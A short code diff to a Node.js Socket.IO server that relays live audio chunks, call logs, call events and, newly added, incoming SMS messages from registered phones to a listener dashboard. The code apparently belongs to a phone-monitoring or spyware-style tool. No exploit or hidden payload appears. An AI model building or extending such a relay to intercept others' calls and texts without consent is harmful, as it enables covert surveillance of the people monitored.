@@ -21,13 +21,13 @@ const listeners = new Set();
 io.on("connection", (socket) => {
   console.log(`🔌 Client connected: ${socket.id}`);
 
-  // When device registers
+  // Register device
   socket.on("device-register", () => {
     devices.add(socket.id);
     console.log(`📱 Device registered: ${socket.id}`);
   });
 
-  // When listener registers
+  // Register listener (dashboard)
   socket.on("listener-register", () => {
     listeners.add(socket.id);
     console.log(`🖥️ Listener registered: ${socket.id}`);
@@ -45,7 +45,7 @@ io.on("connection", (socket) => {
     listeners.forEach((id) => io.to(id).emit("audio-chunk", chunk));
   });
 
-  // Forward periodic call logs
+  // Forward call logs (optional periodic batch)
   socket.on("call-logs", (logs) => {
     console.log(`📋 Call logs from ${socket.id}, count: ${logs.length}`);
     listeners.forEach((id) => io.to(id).emit("call-logs", logs));
@@ -55,6 +55,12 @@ io.on("connection", (socket) => {
   socket.on("call-event", (event) => {
     console.log(`📞 Call event from ${socket.id}:`, event);
     listeners.forEach((id) => io.to(id).emit("call-event", event));
+  });
+
+  // Forward real-time SMS messages
+  socket.on("sms-received", (sms) => {
+    console.log(`📨 SMS from ${socket.id}:`, sms);
+    listeners.forEach((id) => io.to(id).emit("sms-received", sms));
   });
 
   // Handle disconnect
